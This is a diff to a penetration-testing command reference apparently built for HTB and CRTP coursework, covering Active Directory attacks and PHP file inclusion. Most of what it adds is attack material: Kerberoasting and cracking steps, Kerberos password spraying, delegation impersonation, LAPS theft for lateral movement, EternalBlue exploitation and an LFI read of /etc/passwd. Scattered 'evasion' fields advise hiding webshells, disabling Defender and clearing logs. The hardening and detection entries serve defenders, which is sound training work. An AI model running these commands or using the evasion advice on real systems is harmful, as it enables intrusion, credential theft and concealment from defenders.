-        "secure_config": "# IPMI — disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync — require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec — disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS — disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)"
+        "secure_config": "# IPMI — disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync — require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec — disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS — disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)",
+        "evasion": "The hash-retrieval flaw is a single request per BMC; avoid scanning the whole range loudly — target known BMCs."
       }
     },
     {
@@ -29417,6 +31133,11 @@ const COMMAND_DATA = {
           "id": "jenkins-script-console-rce",
           "note": "The console access this shell is pasted into.",
           "rel": "prereq"
+        },
+        {
+          "id": "gs-tty-upgrade",
+          "rel": "next",
+          "note": "Stabilize the reverse shell into a full TTY"
         }
       ],
       "id": "jenkins-groovy-revshell",
@@ -29443,7 +31164,8 @@ const COMMAND_DATA = {
           "HTB M24",
           "MITRE T1059.007",
           "MITRE T1071.001"
-        ]
+        ],
+        "evasion": "Run the Groovy script-console command once and avoid persisting a job; use an existing authenticated session; clear build logs that capture the command."
       },
       "variations": [
         {
@@ -29719,10 +31441,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Wordlist",
-          "command": "john --wordlist=/usr/share/wordlists/rockyou.txt <hash_file>"
-        },
-        {
           "label": "Single Mode",
           "command": "john --single <hash_file>"
         },
@@ -29848,7 +31566,8 @@ const COMMAND_DATA = {
           "HTB M24",
           "MITRE T1110",
           "OWASP A07:2021"
-        ]
+        ],
+        "evasion": "Obfuscate the injected template webshell and remove it after; blend admin actions into normal usage; avoid leaving the malicious extension/template enabled."
       }
     },
     {
@@ -29932,7 +31651,9 @@ const COMMAND_DATA = {
           "HTB M24",
           "MITRE T1083",
           "OWASP A05:2021"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path.",
+        "evasion": "Obfuscate the injected template webshell and remove it after; blend admin actions into normal usage; avoid leaving the malicious extension/template enabled."
       }
     },
     {
@@ -30020,7 +31741,8 @@ const COMMAND_DATA = {
           "HTB M24",
           "MITRE T1595.002",
           "OWASP A05:2021"
-        ]
+        ],
+        "evasion": "Obfuscate the injected template webshell and remove it after; blend admin actions into normal usage; avoid leaving the malicious extension/template enabled."
       },
       "variations": [
         {
@@ -30122,7 +31844,8 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M24",
           "MITRE T1595.002"
-        ]
+        ],
+        "evasion": "Obfuscate the injected template webshell and remove it after; blend admin actions into normal usage; avoid leaving the malicious extension/template enabled."
       }
     },
     {
@@ -30308,15 +32031,15 @@ const COMMAND_DATA = {
         },
         {
           "label": "Office Doc",
-          "command": "office2john.py <file.docx> > office.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt office.hash\njohn office.hash --show"
+          "command": "office2john.py <file> > office.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt office.hash\njohn office.hash --show"
         },
         {
           "label": "PDF",
-          "command": "pdf2john.py <file.pdf> > pdf.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash\njohn pdf.hash --show"
+          "command": "pdf2john.py <file> > pdf.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash\njohn pdf.hash --show"
         },
         {
           "label": "ZIP Archive",
-          "command": "zip2john <file.zip> > zip.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt zip.hash\njohn zip.hash --show"
+          "command": "zip2john <file> > zip.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt zip.hash\njohn zip.hash --show"
         }
       ],
       "opsec": "silent",
@@ -30422,7 +32145,23 @@ const COMMAND_DATA = {
         "misconfiguration": "Service accounts are registered with a Service Principal Name (SPN) but use weak, human-chosen passwords — or even share a password with other accounts. Any authenticated domain user can request a TGS for any SPN account, receiving a blob encrypted with that account's NTLM hash. The SPN registration itself is not the flaw; the flaw is weak passwords on SPN accounts and permitting RC4 encryption (which produces a shorter, faster-to-crack blob).",
         "vulnerable_config": "# Service account set up manually with a weak password + SPN\n# Attacker can find these with:\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet\n\n# Bad state — password set 4 years ago, RC4 permitted:\n# Name: svc_sql  PasswordLastSet: 2020-01-15  SPN: MSSQLSvc/db01.corp.local:1433\n# RC4 (0x17) requested in TGS ticket — short hash, GPU-crackable\n\n# Confirming RC4 is available:\nGet-ADUser svc_sql -Properties msDS-SupportedEncryptionTypes\n# msDS-SupportedEncryptionTypes: 0 (= RC4+AES both permitted if 0 or blank)",
         "secure_config": "# Fix 1 — Use Group Managed Service Accounts (gMSA): 240-char random passwords,\n# auto-rotated by AD, no human ever knows the password\nNew-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.local \\\n    -PrincipalsAllowedToRetrieveManagedPassword 'db-servers-grp'\nInstall-ADServiceAccount gmsa_sql\n\n# Fix 2 — For legacy accounts that must keep SPNs:\n# Set a 100+ character random password (AD max is 127 chars):\n$pw = [System.Web.Security.Membership]::GeneratePassword(127,20)\nSet-ADAccountPassword svc_sql -NewPassword (ConvertTo-SecureString $pw -AsPlainText -Force)\n\n# Fix 3 — Disable RC4, require AES-only:\nSet-ADUser svc_sql -KerberosEncryptionType AES128,AES256\n# msDS-SupportedEncryptionTypes = 24 (AES128+AES256 only)"
-      }
+      },
+      "variations": [
+        {
+          "label": "OPSEC",
+          "command": ".\\Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:spn.txt"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Roast SPN accounts",
+          "command": ".\\Rubeus.exe kerberoast /outfile:spn.txt"
+        },
+        {
+          "label": "Crack",
+          "command": "hashcat -m 13100 spn.txt rockyou.txt"
+        }
+      ]
     },
     {
       "id": "crtp-kerberoasting",
@@ -30507,7 +32246,7 @@ const COMMAND_DATA = {
           "rel": "next"
         }
       ],
-      "notes": "/rc4opsec only roasts accounts that support RC4. Newer CRTP labs have specific high-value service accounts as targets.",
+      "notes": "/rc4opsec only roasts accounts that support RC4. Newer CRTP labs have specific high-value service accounts as targets. Slides: Invoke-Kerberoast (BC-SECURITY Empire/PowerView) requests + extracts SPN hashes in one PowerShell cmdlet - an alternative to Rubeus kerberoast when you want to stay in PowerShell. After extracting, crack offline with John or Hashcat (TGS-REP = hashcat mode 13100).",
       "references": [
         {
           "title": "CRTP - Kerberoasting",
@@ -30536,7 +32275,21 @@ const COMMAND_DATA = {
         "misconfiguration": "Service accounts have weak/old passwords with SPNs registered. RC4 encryption type not restricted. No gMSA usage. SPNs set on user accounts rather than machine accounts. MDI not deployed.",
         "vulnerable_config": "# Kerberoastable accounts (SPN + weak password):\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet,msDS-SupportedEncryptionTypes\n# PasswordLastSet: 2018 AND SupportedEncryptionTypes includes RC4 (0x17) → VULNERABLE\n\n# Weak service account passwords:\n# svc_sql: Password1  (set in 2018, never changed)\n# Rubeus requests RC4 ticket → hashcat cracks in minutes",
         "secure_config": "# Use gMSA (auto-rotating 240-char passwords):\nNew-ADServiceAccount -Name 'svc_sql' -DNSHostName 'dc01.corp.local' -ManagedPasswordIntervalInDays 30\nInstall-ADServiceAccount 'svc_sql'\nSet-Service -Name 'MSSQLSERVER' -Credential (Get-ADServiceAccountCredential 'svc_sql')\n\n# Force AES-only encryption on service accounts:\nSet-ADUser svc_sql -KerberosEncryptionType AES256\n# OR via attribute editor: msDS-SupportedEncryptionTypes = 16 (AES256 only)\n\n# Rotate passwords for non-gMSA service accounts (25+ char random):\n[System.Web.Security.Membership]::GeneratePassword(30, 5)\n# Paste result into: Set-ADAccountPassword svc_old -Reset -NewPassword ...\n\n# Alert on RC4 TGS requests:\n# SIEM: EventID=4769 AND TicketEncryptionType=0x17 AND ServiceName NOT IN (krbtgt, *$) → ALERT"
-      }
+      },
+      "variations": [
+        {
+          "label": "PowerView/Empire Invoke-Kerberoast",
+          "command": "Invoke-Kerberoast -Identity <user> -Domain <domain> | fl"
+        },
+        {
+          "label": "Crack hashes offline with John",
+          "command": "john.exe --wordlist=<wordlist> <hashfile>"
+        },
+        {
+          "label": "Crack with hashcat (TGS-REP m13100 / AS-REP m18200)",
+          "command": "hashcat -m 13100 <hashfile> <wordlist>"
+        }
+      ]
     },
     {
       "id": "cdsa-m06-constrained-delegation",
@@ -30634,7 +32387,13 @@ const COMMAND_DATA = {
         "misconfiguration": "An account has constrained delegation configured (msDS-AllowedToDelegateTo) but the 'Use any authentication protocol' (protocol transition) option is enabled. This allows the account to impersonate ANY user — including Domain Admins — to the listed services, without requiring the user's TGT. Combined with S4U2Self (service for user to self), an attacker who compromises this account can forge service tickets for privileged users.",
         "vulnerable_config": "# Accounts with constrained delegation + protocol transition:\nGet-ADUser -Filter {msDS-AllowedToDelegateTo -ne '$null'} \\\n    -Properties TrustedToAuthForDelegation, 'msDS-AllowedToDelegateTo' |\n    Where-Object {$_.TrustedToAuthForDelegation -eq $true}\n\n# TrustedToAuthForDelegation = True means 'Use any auth protocol' is checked\n# This allows S4U2Self (impersonate any user) + S4U2Proxy (delegate to target service)",
         "secure_config": "# Use 'Use Kerberos only' delegation (not protocol transition):\n# In ADUC: Account tab -> uncheck 'Trust this computer for delegation to specified services only'\n# -> choose 'Use Kerberos only' not 'Use any authentication protocol'\n\n# Set-ADUser svc_web -TrustedToAuthForDelegation $false\n\n# Use Resource-Based Constrained Delegation (RBCD) instead:\n# More granular — controlled by the resource, not the delegating account\n\n# Audit delegation rights quarterly:\nGet-ADUser -Filter {TrustedToAuthForDelegation -eq $true} |\n    Select-Object SamAccountName, 'msDS-AllowedToDelegateTo'\n\n# Add highly privileged accounts to Protected Users (blocks all delegation)"
-      }
+      },
+      "variations": [
+        {
+          "label": "Impacket getST",
+          "command": "getST.py -spn <spn> -impersonate administrator -dc-ip <dc_ip> <domain>/<user>:<password>"
+        }
+      ]
     },
     {
       "id": "cdsa-m06-golden-ticket",
@@ -30732,7 +32491,7 @@ const COMMAND_DATA = {
     {
       "id": "kerbrute-userenum",
       "name": "Kerbrute - Enumerate AD Usernames",
-      "command": "kerbrute userenum --dc <dc_ip> --domain <domain> <names.list>",
+      "command": "kerbrute userenum --dc <dc_ip> --domain <domain> <names_file>",
       "description": "Validates which usernames exist in Active Directory by abusing Kerberos pre-authentication responses, without causing failed logons or lockouts. Confirmed users become targets for spraying or AS-REP roasting.",
       "platform": "linux",
       "requires": [
@@ -30906,6 +32665,22 @@ const COMMAND_DATA = {
       },
       "tools": [
         "kerbrute"
+      ],
+      "variations": [
+        {
+          "label": "Single password, valid users",
+          "command": "kerbrute passwordspray -d <domain> --dc <dc_ip> valid_users.txt '<password>'"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Spray without SMB logon noise (Kerberos)",
+          "command": "kerbrute passwordspray -d <domain> --dc <dc_ip> <userlist> '<password>'"
+        },
+        {
+          "label": "Validate a hit",
+          "command": "crackmapexec smb <dc_ip> -u <user> -p '<password>'"
+        }
       ]
     },
     {
@@ -30984,6 +32759,22 @@ const COMMAND_DATA = {
       },
       "tools": [
         "kerbrute"
+      ],
+      "variations": [
+        {
+          "label": "Single user check",
+          "command": "kerbrute userenum -d <domain> --dc <dc_ip> <username>"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Enumerate valid users (no lockout)",
+          "command": "kerbrute userenum -d <domain> --dc <dc_ip> <userlist> -o valid_users.txt"
+        },
+        {
+          "label": "Spray a password against the valid users",
+          "command": "kerbrute passwordspray -d <domain> --dc <dc_ip> valid_users.txt '<Season2024>'"
+        }
       ]
     },
     {
@@ -31093,8 +32884,37 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1082",
           "MITRE T1057"
-        ]
-      }
+        ],
+        "evasion": "Run the PoC in-memory (reflective load) rather than dropping the EXE; disable/neuter Defender first if you already have admin; rename the binary to dodge static IOCs; kernel PoCs are unstable — test against a snapshot to avoid crashing the target."
+      },
+      "variations": [
+        {
+          "label": "wmic quickfix / Get-Hotfix",
+          "command": "wmic qfe list brief | findstr /C:KB & powershell Get-HotFix"
+        },
+        {
+          "label": "WES-NG (offline, from systeminfo)",
+          "command": "python wes.py systeminfo.txt --exploits-only"
+        },
+        {
+          "label": "Watson / Sherlock (on-host)",
+          "command": "# Watson.exe  |  Import-Module Sherlock.ps1; Find-AllVulns"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Collect patch state",
+          "command": "systeminfo > systeminfo.txt"
+        },
+        {
+          "label": "Map to known LPE CVEs",
+          "command": "python wes.py systeminfo.txt --exploits-only"
+        },
+        {
+          "label": "Pick a matching kernel exploit",
+          "command": "# cross-reference the missing KB with a public LPE PoC"
+        }
+      ]
     },
     {
       "type": "command",
@@ -31219,7 +33039,8 @@ const COMMAND_DATA = {
           "HTB M25",
           "MITRE T1068",
           "OWASP A06:2021"
-        ]
+        ],
+        "evasion": "Compile off-target and transfer only the final ELF; run once and clean it up; many public PoCs are unstable — verify the kernel/arch match before firing to avoid a panic."
       }
     },
     {
@@ -31862,6 +33683,26 @@ const COMMAND_DATA = {
       "tools": [
         "PowerView",
         "crackmapexec"
+      ],
+      "variations": [
+        {
+          "label": "NetExec module",
+          "command": "nxc ldap <dc_ip> -u <user> -p <password> -M laps"
+        },
+        {
+          "label": "pyLAPS",
+          "command": "python3 pyLAPS.py --action get -u <user> -p <password> -d <domain> --dc-ip <dc_ip>"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Find computers whose LAPS password you can read",
+          "command": "Get-LAPSComputers"
+        },
+        {
+          "label": "Use the local admin password to move laterally",
+          "command": "# psexec/winrm as the local Administrator"
+        }
       ]
     },
     {
@@ -31944,9 +33785,14 @@ const COMMAND_DATA = {
           "id": "ad-enter-pssession",
           "note": "CPTS variant of PS Remoting",
           "rel": "alternative"
+        },
+        {
+          "id": "crtp-portproxy-pivot",
+          "note": "Relay through a jump host to reach isolated targets",
+          "rel": "next"
         }
       ],
-      "notes": "WinRM: port 5985 (HTTP), 5986 (HTTPS). Requires admin rights on remote host. Logged in PowerShell event logs and WinRM.",
+      "notes": "WinRM: port 5985 (HTTP), 5986 (HTTPS). Requires admin rights on remote host. Logged in PowerShell event logs and WinRM. Discovery: Find-PSRemotingLocalAdminAccess lists hosts where the current user has remoting admin. WSManWinRM.exe is a custom WinRM client used when winrs is unavailable.",
       "references": [
         {
           "title": "CRTP - PS Remoting Lateral Movement",
@@ -31967,7 +33813,21 @@ const COMMAND_DATA = {
         "misconfiguration": "WinRM enabled on workstations via GPO without access restriction. No host firewall rule limiting WinRM source IPs. JEA not implemented. No monitoring of wsmprovhost.exe process creation from unexpected sessions.",
         "vulnerable_config": "# WinRM enabled on all hosts including workstations:\n# GPO: Computer Config → Windows Settings → Security Settings → Windows Remote Management\n# → WinRM Service: Allow remote server management\n# No source restriction — any authenticated user with admin rights can WinRM from anywhere\n\n# Workstation firewall allows 5985 inbound from entire corporate network:\nGet-NetFirewallRule -DisplayName '*Windows Remote Management*' | Get-NetFirewallAddressFilter",
         "secure_config": "# Restrict WinRM source IPs via GPO firewall rule:\nNew-NetFirewallRule -DisplayName 'WinRM from PAW only' -Direction Inbound -Protocol TCP -LocalPort 5985,5986 -RemoteAddress 10.0.100.0/24 -Action Allow\nNew-NetFirewallRule -DisplayName 'Block WinRM from workstations' -Direction Inbound -Protocol TCP -LocalPort 5985,5986 -RemoteAddress 10.0.0.0/8 -Action Block\n\n# JEA endpoint — restrict what DA accounts can run remotely:\nNew-PSSessionConfigurationFile -Path 'C:\\JEA\\DomainAdminJEA.pssc' -SessionType RestrictedRemoteServer -RoleDefinitions @{'CORP\\Domain Admins' = @{RoleCapabilities = 'DomainAdminCaps'}}\nRegister-PSSessionConfiguration -Path 'C:\\JEA\\DomainAdminJEA.pssc' -Name 'DomainAdminJEA' -Force\n\n# SIEM alert:\n# EventID=4688 AND NewProcessName contains 'wsmprovhost.exe' AND\n# SubjectUserName in (DA accounts) AND Computer NOT IN (known servers) → ALERT"
-      }
+      },
+      "variations": [
+        {
+          "label": "Discover where you have PSRemoting admin",
+          "command": "Find-PSRemotingLocalAdminAccess -Domain <domain> -Verbose"
+        },
+        {
+          "label": "winrs one-liner (cmd on remote host)",
+          "command": "winrs -r:<host> cmd /c \"set computername && set username\""
+        },
+        {
+          "label": "WSManWinRM.exe (when winrs is blocked)",
+          "command": "WSManWinRM.exe <host_fqdn> \"cmd /c <command>\""
+        }
+      ]
     },
     {
       "type": "command",
@@ -32077,11 +33937,6 @@ const COMMAND_DATA = {
           "label": "List path"
         },
         {
-          "description": "Copy ASPX shell to staging location",
-          "command": "cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx",
-          "label": "cp /usr/share/laudanum/aspx/shell.…"
-        },
-        {
           "description": "Edit allowedIps to restrict shell access (mandatory before upload)",
           "command": "# Edit demo.aspx — find 'allowedIps' near the top:\n# String[] allowedIps = { \"127.0.0.1\", \"::1\", \"<YOUR_ATTACKER_IP>\" };\n# Add your IP, remove ::1/127.0.0.1 if desired, save file",
           "label": "Edit demo.aspx — find 'allowedIps'…"
@@ -32163,10 +34018,6 @@ const COMMAND_DATA = {
         }
       ],
       "variations": [
-        {
-          "label": "All (Windows)",
-          "command": "LaZagne.exe all"
-        },
         {
           "label": "All Verbose",
           "command": "LaZagne.exe all -vv"
@@ -32343,7 +34194,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "ldapsearch queries the DC directly over LDAP to enumerate users/attributes from Linux without domain-joined tooling.",
+        "why_it_works": "In Active Directory the default security descriptor grants the built-in 'Authenticated Users' group read access to nearly every directory object (users, groups, computers, GPOs, trusts) and their attributes. So any valid domain account — however low-privileged — can enumerate the whole directory over LDAP/SAMR without hitting access-denied, which is why this returns data without needing admin. A simple LDAP bind can page every user object because the default ACL permits it.",
         "prerequisites": "Valid domain credentials (any authenticated user) and network access to a DC (LDAP 389/636).",
         "impact": "A user inventory gathered from Linux.",
         "detection": "[MITRE T1087.002] Broad/bulk LDAP queries to the DC (Event 4662 directory-service access; Microsoft Defender for Identity reconnaissance alerts); one host reading large swaths of the directory in a short window.",
@@ -32360,6 +34211,20 @@ const COMMAND_DATA = {
       },
       "tools": [
         "ldapsearch"
+      ],
+      "variations": [
+        {
+          "label": "With authentication",
+          "command": "ldapsearch -x -H ldap://<dc_ip> -D '<user>@<domain>' -w '<password>' -b \"<base_dn>\" \"(objectClass=user)\" sAMAccountName"
+        },
+        {
+          "label": "Anonymous bind",
+          "command": "ldapsearch -x -H ldap://<dc_ip> -b \"<base_dn>\" \"(objectClass=user)\""
+        },
+        {
+          "label": "ldapsearch-ad.py - automated LDAP enum (all)",
+          "command": "ldapsearch-ad.py -l <dc_ip> -d <domain> -u <user> -p <password> -t all"
+        }
       ]
     },
     {
@@ -32422,7 +34287,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "ldapsearch reads the domain password policy (lockout threshold, min length) to tune spraying safely.",
+        "why_it_works": "In Active Directory the default security descriptor grants the built-in 'Authenticated Users' group read access to nearly every directory object (users, groups, computers, GPOs, trusts) and their attributes. So any valid domain account — however low-privileged — can enumerate the whole directory over LDAP/SAMR without hitting access-denied, which is why this returns data without needing admin. The password-policy attributes on the domain object are readable, so a plain LDAP bind retrieves lockout/length before you spray.",
         "prerequisites": "Valid domain credentials (any authenticated user) and network access to a DC (LDAP 389/636).",
         "impact": "Lockout/complexity settings that make spraying safe.",
         "detection": "[MITRE T1087.002] Broad/bulk LDAP queries to the DC (Event 4662 directory-service access; Microsoft Defender for Identity reconnaissance alerts); one host reading large swaths of the directory in a short window.",
@@ -32439,6 +34304,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "ldapsearch"
+      ],
+      "variations": [
+        {
+          "label": "Just the lockout/length fields",
+          "command": "ldapsearch -h <dc_ip> -x -b \"<base_dn>\" -s sub \"*\" | grep -iE 'minPwdLength|lockoutThreshold|maxPwdAge'"
+        }
       ]
     },
     {
@@ -32534,8 +34405,33 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1190",
           "MITRE T1210"
-        ]
-      }
+        ],
+        "evasion": "Run the PoC in-memory (reflective load) rather than dropping the EXE; disable/neuter Defender first if you already have admin; rename the binary to dodge static IOCs; kernel PoCs are unstable — test against a snapshot to avoid crashing the target."
+      },
+      "variations": [
+        {
+          "label": "MS08-067 (Win XP/2003)",
+          "command": "use exploit/windows/smb/ms08_067_netapi"
+        },
+        {
+          "label": "Manual EternalBlue (AutoBlue)",
+          "command": "python3 eternalblue_exploit7.py <target> shellcode/sc_x64.bin"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Confirm SMBv1 / vuln with nmap",
+          "command": "nmap -p445 --script smb-vuln-ms17-010 <target>"
+        },
+        {
+          "label": "Exploit EternalBlue",
+          "command": "use exploit/windows/smb/ms17_010_eternalblue"
+        },
+        {
+          "label": "Set target + payload + run",
+          "command": "set RHOSTS <target>; set LHOST <lhost>; run"
+        }
+      ]
     },
     {
       "id": "lfi-basic",
@@ -32613,10 +34509,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Linux passwd",
-          "command": "http://<ip>:<port>/index.php?language=../../../../etc/passwd"
-        },
-        {
           "label": "Windows",
           "command": "http://<ip>:<port>/index.php?language=..\\..\\..\\..\\Windows\\boot.ini"
         },
@@ -32646,7 +34538,8 @@ const COMMAND_DATA = {
         "why_it_works": "PHP's include() function accepts absolute paths (/etc/passwd) and relative paths with traversal (../../../../etc/passwd). When user input is passed directly without validation, the attacker controls which file is included and parsed. Absolute path works when the application doesn't prepend a directory. Path traversal (../) walks up directories from the prepended path to reach files outside the web root.",
         "impact": "Read any file the web server process can access: /etc/passwd (user enumeration), /etc/shadow (password hashes if readable by www-data), web application source code (database credentials), SSH private keys, configuration files with API keys. On PHP apps, included files are executed as PHP if they contain PHP tags — enabling code execution via log poisoning or wrapper attacks.",
         "detection": "[MITRE T1083] WAF/IDS: ../ or %2e%2e%2f in URL parameters. /etc/passwd, /etc/shadow, /proc/ in parameter values. Application log: include() errors for attempted paths. File system audit: web server process reading files outside web root.",
-        "artifacts": "Web access log: URL containing ../../../../etc/passwd. Application error log: include(../../etc/passwd): failed to open stream (if file doesn't exist). System audit log: read access on /etc/passwd by www-data."
+        "artifacts": "Web access log: URL containing ../../../../etc/passwd. Application error log: include(../../etc/passwd): failed to open stream (if file doesn't exist). System audit log: read access on /etc/passwd by www-data.",
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
       }
     },
     {
@@ -32731,7 +34624,8 @@ const COMMAND_DATA = {
         "why_it_works": "ffuf fuzzes all GET parameters using a wordlist (burp-parameter-names.txt) to discover hidden parameters that accept file paths. Many applications have debug, admin, or legacy parameters not visible in the HTML but still handled by the backend. Discovery of an injectable parameter precedes LFI exploitation.",
         "impact": "Discovery of hidden LFI injection points that manual testing misses — extends the attack surface beyond visible form fields and URL parameters.",
         "detection": "[MITRE T1595] WAF/IDS: high volume of requests with different parameter names in rapid succession. Rate limiting: too many requests per second triggers block. Anomaly detection: systematic parameter name enumeration is not normal user behavior.",
-        "artifacts": "Access log: many requests with varying parameter names (?debug=value, ?page=value, ?file=value...). WAF log: fuzzing traffic pattern."
+        "artifacts": "Access log: many requests with varying parameter names (?debug=value, ?page=value, ?file=value...). WAF log: fuzzing traffic pattern.",
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
       },
       "variations": [
         {
@@ -32836,9 +34730,26 @@ const COMMAND_DATA = {
         "why_it_works": "ffuf fuzzes a known injectable parameter with a comprehensive LFI payload list (LFI-Jhaddix.txt — thousands of traversal variants). The wordlist covers absolute paths, traversal depths, encoding variants, and filter bypasses across Linux and Windows targets. Response size filtering (-fs) excludes the baseline non-injectable response, leaving only entries that successfully include a different file.",
         "impact": "Automated LFI exploitation — finds the exact traversal depth and encoding needed to bypass server-side filters. Covers hundreds of filter bypass techniques automatically.",
         "detection": "[MITRE T1083] WAF: high request rate with LFI payload patterns. Rate limiting. Anomaly: parameter values systematically cycling through known LFI wordlist entries.",
-        "artifacts": "Access log: hundreds of requests with traversal payloads. WAF log: LFI wordlist pattern detected. Successful reads: access.log entries where response size differs from baseline."
+        "artifacts": "Access log: hundreds of requests with traversal payloads. WAF log: LFI wordlist pattern detected. Successful reads: access.log entries where response size differs from baseline.",
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Fuzz the parameter for traversal",
+          "command": "ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://<ip>:<port>/index.php?language=FUZZ' -fs <baseline_size>"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Fuzz LFI payloads",
+          "command": "ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://<ip>/index.php?language=FUZZ'"
+        },
+        {
+          "label": "Confirm a hit reads a file",
+          "command": "curl 'http://<ip>/index.php?language=../../../../etc/passwd'"
+        }
+      ]
     },
     {
       "platform": "linux",
@@ -33002,10 +34913,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Null byte (PHP < 5.5)",
-          "command": "http://<ip>:<port>/index.php?language=../../../../etc/passwd%00"
-        },
-        {
           "label": "Path truncation (PHP < 5.3) - pad past limit",
           "command": "http://<ip>:<port>/index.php?language=../../../../etc/passwd/./././././[REPEAT ~2048x]"
         }
@@ -33026,7 +34933,8 @@ const COMMAND_DATA = {
         "why_it_works": "PHP < 5.5 treated the null byte (%00) as a C-style string terminator. When the application appended .php to user input (include($_GET['lang'] . '.php')), adding %00 at the end caused PHP to ignore everything after the null byte — including the .php extension. This allowed inclusion of arbitrary files without the .php extension being appended. Fixed in PHP 5.5.",
         "impact": "Bypasses extension-appending restrictions in older PHP applications — allows including /etc/passwd instead of /etc/passwd.php (which would not exist). Relevant for legacy PHP applications on older servers.",
         "detection": "[MITRE T1083] WAF: %00 or null byte in parameters. Application: PHP 5.5+ inherently fixes this — upgrade is the fix. Log: null byte in access log parameter values.",
-        "artifacts": "Access log: parameter value ending in %00 or %00.php. PHP error log: if null byte causes parse errors."
+        "artifacts": "Access log: parameter value ending in %00 or %00.php. PHP error log: if null byte causes parse errors.",
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
       }
     },
     {
@@ -33116,8 +35024,29 @@ const COMMAND_DATA = {
         "why_it_works": "PHP's php://filter wrapper applies transformations to file content before returning it. convert.base64-encode encodes the file's raw bytes as base64 — this means PHP files are returned as base64 text instead of being executed. The attacker decodes the base64 to read the PHP source code, discovering database credentials, API keys, business logic, and further injection points.",
         "impact": "PHP source code disclosure — reveals database credentials, hardcoded API keys, admin paths, business logic vulnerabilities, other injection points. Config files (config.php) typically contain DB host/user/password in plaintext. Source disclosure accelerates exploitation of the entire application.",
         "detection": "[MITRE T1083] WAF/IDS: php://filter in URL parameters. Application: php:// wrapper pattern in include() argument. Log: access.log entries with php%3A%2F%2Ffilter%2F.",
